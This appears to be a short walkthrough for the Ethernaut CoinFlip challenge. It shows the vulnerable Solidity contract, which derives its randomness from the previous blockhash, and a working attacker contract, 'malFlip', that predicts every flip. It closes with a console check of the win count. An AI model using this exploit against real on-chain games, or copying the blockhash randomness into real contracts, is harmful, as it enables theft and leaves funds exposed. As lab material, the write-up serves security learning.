
we are tasked to guess the coin toss 10 times in a row. The below contract is the one loaded into remixIDE. 

loading from github
```
https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/CoinFlip.sol
```

in remix use the injected Web3.


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

the malicious contract is rerun alongside the vulnerable contract on remix. 

in remix deploy malFlip
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract malFlip {
  // use the ethernaut account info
  CoinFlip public oc = CoinFlip(0x15787F394B450fD7fFD754e4057C5E18c13d75fF);
  using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  function attackFlip() public {

    // get the flip guess
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool guess = coinFlip == 1 ? true : false;

    if (lastHash == blockValue) {
      revert();
    }
    lastHash = blockValue;

    // always correct
    oc.flip(guess);

  }

}
```

basically when we run the original contract and then run the attackFlip, We will always guess right. 

to check if we guessed correctly. run in chrome console like before.
```
await contract.consecutiveWins().then(x => x.toNumber())
```